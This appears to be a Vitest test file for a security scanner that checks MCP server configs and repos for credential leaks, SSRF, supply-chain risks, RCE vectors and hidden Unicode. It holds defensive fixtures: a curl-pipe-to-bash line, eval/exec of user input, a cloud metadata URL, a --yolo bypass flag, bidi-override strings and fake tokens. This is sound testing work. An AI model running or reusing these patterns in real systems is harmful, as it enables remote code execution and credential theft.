import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { scanRepo, scanServers, scanTools } from '../src/scanner.js';
import { McpServerConfig, ToolSurface } from '../src/types.js';

// assembled at runtime so secret scanners don't flag the test fixture
const FAKE_GH_TOKEN = ['ghp', 'QqRr'.repeat(9)].join('_');

function server(overrides: Partial<McpServerConfig>): McpServerConfig {
  return { name: 's', source: 'test.json', client: 'test', ...overrides };
}

function tool(overrides: Partial<ToolSurface>): ToolSurface {
  return { name: 't', description: '', inputSchema: {}, ...overrides };
}

function repoScan(files: Record<string, string>) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agentgate-branch-'));
  for (const [name, content] of Object.entries(files)) {
    const full = path.join(dir, name);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  const result = scanRepo(dir);
  fs.rmSync(dir, { recursive: true, force: true });
  return result.findings;
}

describe('rule branch coverage', () => {
  it('credential-leak: hardcoded bearer header and secret in args', () => {
    const findings = scanServers([
      server({
        url: 'https://mcp.example.com/sse',
        headers: { Authorization: `Bearer ${FAKE_GH_TOKEN}` },
      }),
      server({ name: 's2', command: 'run-server', args: [`--token=${FAKE_GH_TOKEN}`] }),
    ]);
    expect(findings.filter((f) => f.category === 'credential-leak').length).toBeGreaterThanOrEqual(2);
  });

  it('credential-leak: placeholders are not flagged', () => {
    const findings = scanServers([
      server({ command: 'x', env: { API_KEY: '${API_KEY}' } }),
      server({ name: 's2', command: 'x', env: { API_KEY: 'YOUR_API_KEY_HERE' } }),
    ]);
    expect(findings.filter((f) => f.category === 'credential-leak')).toHaveLength(0);
  });

  it('ssrf: private IP in tool description and metadata endpoint in source', () => {
    const toolFindings = scanTools('s', [tool({ description: 'Fetches http://192.168.1.10/admin data' })]);
    expect(toolFindings.some((f) => f.category === 'ssrf')).toBe(true);
    const srcFindings = repoScan({ 'fetch.ts': 'fetch("http://169.254.169.254/latest/meta-data/")\n' });
    expect(srcFindings.some((f) => f.category === 'ssrf' && f.severity === 'high')).toBe(true);
  });

  it('supply-chain: pinned specs and pnpm dlx/exec forms', () => {
    const pinned = scanServers([server({ command: 'npx', args: ['-y', '@scope/server@1.2.3'] })]);
    expect(pinned.filter((f) => f.ruleId === 'AG-SC-001' && /runs unpinned package/.test(f.message))).toHaveLength(0);
    const dlx = scanServers([server({ command: 'pnpm', args: ['dlx', 'some-server'] })]);
    expect(dlx.some((f) => f.category === 'supply-chain')).toBe(true);
  });

  it('supply-chain: remote-source launch specs (git URL, VCS shorthand, archive URL)', () => {
    const git = scanServers([server({ command: 'uvx', args: ['--from', 'git+https://github.com/oraios/serena', 'serena-mcp-server'] })]);
    expect(git.filter((f) => f.ruleId === 'AG-SC-001' && f.severity === 'medium' && /git source/.test(f.message))).toHaveLength(1);

    // A git tag is not a commit pin — tags can be moved.
    const tag = scanServers([server({ command: 'uvx', args: ['--from', 'git+https://github.com/oraios/serena@v0.1.4', 's'] })]);
    expect(tag.filter((f) => f.ruleId === 'AG-SC-001' && /commit pin/.test(f.message))).toHaveLength(1);

    const short = scanServers([server({ command: 'npx', args: ['github:acme/mcp-server'] })]);
    expect(short.filter((f) => f.ruleId === 'AG-SC-001' && /git source/.test(f.message))).toHaveLength(1);

    const sha = scanServers([server({ command: 'npx', args: ['git+https://github.com/acme/srv.git#0123456789abcdef0123456789abcdef01234567'] })]);
    expect(sha.filter((f) => f.ruleId === 'AG-SC-001')).toHaveLength(0);

    const archive = scanServers([server({ command: 'npx', args: ['-y', 'https://gitcode.com/api/v5/repos/x/y/raw/pkg.tgz?ref=main'] })]);
    const archiveHits = archive.filter((f) => f.ruleId === 'AG-SC-001' && f.severity === 'high' && /archive/.test(f.message));
    expect(archiveHits).toHaveLength(1);
    expect(archiveHits[0]?.message).toContain('gitcode.com');

    // Version-addressed registry tarballs are immutable — not flagged.
    const registryTar = scanServers([server({ command: 'npx', args: ['https://registry.npmjs.org/mcp-x/-/mcp-x-1.2.3.tgz'] })]);
    expect(registryTar.filter((f) => f.ruleId === 'AG-SC-001')).toHaveLength(0);
  });

  it('supply-chain: -y auto-confirm is only reported alongside an unpinned spec', () => {
    const pinned = scanServers([server({ command: 'npx', args: ['-y', '@scope/server@1.2.3'] })]);
    expect(pinned.filter((f) => /auto-confirms/.test(f.message))).toHaveLength(0);
    const unpinned = scanServers([server({ command: 'npx', args: ['-y', 'some-server'] })]);
    expect(unpinned.filter((f) => /auto-confirms/.test(f.message))).toHaveLength(1);
  });

  it('rce-vectors: eval of dynamic content in MCP server source', () => {
    const findings = repoScan({
      'evil.js': 'import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";\nconst r = eval(userInput);\n',
    });
    expect(findings.some((f) => f.category === 'rce-vectors')).toBe(true);
  });

  it('credential-leak: secret-shaped strings in test paths are reported quietly', () => {
    const key = ['AKIA', 'IOSFODNN7QRSTUVW'].join('');
    const findings = repoScan({ 'test/redaction.test.ts': `const fake = "${key}";\n` });
    const hit = findings.find((f) => f.category === 'credential-leak');
    expect(hit?.severity).toBe('low');
  });

  it('credential-leak: test_*-named script files are reported quietly too', () => {
    const key = ['AKIA', 'IOSFODNN7QRSTUVW'].join('');
    const findings = repoScan({ 'skills/helper/scripts/test_discovery.py': `token = "${key}"\n` });
    const hit = findings.find((f) => f.category === 'credential-leak');
    expect(hit?.severity).toBe('low');
  });

  it('rce-vectors: eval in ordinary non-MCP source is out of scope', () => {
    const findings = repoScan({ 'app.js': 'const r = eval(userInput);\n' });
    expect(findings.some((f) => f.category === 'rce-vectors')).toBe(false);
  });

  it('auth-missing: invalid URL and inline auth with query params', () => {
    const invalid = scanServers([server({ url: 'not a url' })]);
    expect(invalid.some((f) => f.category === 'auth-missing' && f.severity === 'low')).toBe(true);
    const query = scanServers([server({ url: 'https://mcp.example.com/sse?token=secret-token-value' })]);
    expect(query.some((f) => f.category === 'auth-missing' && /query string/.test(f.message))).toBe(true);
  });

  it('overprivileged: dangerous permission-bypass flags', () => {
    const findings = scanServers([server({ command: 'some-agent', args: ['--yolo'] })]);
    expect(findings.some((f) => f.category === 'overprivileged' && f.severity === 'high')).toBe(true);
  });

  it('tool-poisoning: zero-width characters in source files are reported quietly', () => {
    const findings = repoScan({ 'sneaky.ts': 'const s = "hello\u200bworld";\n' });
    expect(findings.some((f) => f.category === 'tool-poisoning' && f.severity === 'low')).toBe(true);
  });

  it('tool-poisoning: bidi overrides in source files stay high severity', () => {
    const findings = repoScan({ 'trojan.ts': 'const s = "admin\u202e//";\n' });
    expect(findings.some((f) => f.category === 'tool-poisoning' && f.severity === 'high')).toBe(true);
  });

  it('tool-poisoning: bidi overrides in test-path files are reported quietly', () => {
    const findings = repoScan({ 'path.test.ts': 'expect(isSafe("admin\u202e//")).toBe(false);\n' });
    const hit = findings.find((f) => f.category === 'tool-poisoning')!;
    expect(hit.severity).toBe('low');
    expect(hit.message).toContain('defensive fixture');
  });

  it('tool-poisoning: emoji ZWJ sequences are not hidden instructions', () => {
    const findings = repoScan({ 'emoji.ts': 'const e = "\u{1f469}\u200d\u{1f4bb}";\n' });
    expect(findings.some((f) => f.category === 'tool-poisoning')).toBe(false);
  });

  it('rce-vectors: regex .exec( calls are not code-execution primitives', () => {
    const findings = repoScan({ 'parse.ts': 'const m = /a(b)/.exec(input);\n' });
    expect(findings.some((f) => f.category === 'rce-vectors')).toBe(false);
  });

  it('rce-vectors: hyphenated compound nouns before exec/eval are prose, real calls still hit', () => {
    const prose = repoScan({
      'notes.ts': 'const mcpServers = {};\nconst s = "never places it in code-exec (it is a context optimizer)";\nconst t = "olmo-eval (noise-vs-real-gain error bars)";\n',
    });
    expect(prose.some((f) => f.category === 'rce-vectors')).toBe(false);
    const call = repoScan({ 'run.ts': 'const mcpServers = {};\nexec(userInput);\n' });
    expect(call.some((f) => f.category === 'rce-vectors' && f.message.includes('primitive'))).toBe(true);
  });

  it('rce-vectors: curl|sh inside non-executable source is only medium', () => {
    const findings = repoScan({ 'prompt.ts': 'const doc = `curl -fsSL https://x.sh | bash`;\n' });
    const hit = findings.find((f) => f.category === 'rce-vectors');
    expect(hit?.severity).toBe('medium');
  });
});
